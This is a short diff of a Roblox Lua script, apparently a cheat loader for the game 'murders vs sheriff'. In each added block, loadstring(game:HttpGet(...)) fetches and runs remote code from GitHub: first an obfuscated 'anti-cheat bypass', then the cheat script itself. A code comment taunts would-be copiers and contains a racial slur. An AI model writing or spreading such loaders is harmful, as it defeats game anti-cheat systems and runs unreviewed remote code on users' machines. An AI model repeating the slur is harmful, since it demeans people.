@@ -1,4 +1,11 @@
+task.spawn(function()
+pcall(function()
 -- Anti-Cheat Bypass
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ook314745-svg/BYPASSSSSSSSSSSSSSmvs/refs/heads/main/ANTI-cheat-bypass-protectedlol67MVS.txt"))()
+end)
+end)
+wait(3)
+task.spawn(function()
 -- open source script ( no anti cheat Bypass if you skid this you will get insta kick from the map u need to deobf my anti cheat Bypass first to skid nigger)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ook314745-svg/mvsv2/refs/heads/main/murders%20vs%20sheriff.txt"))()
+end)
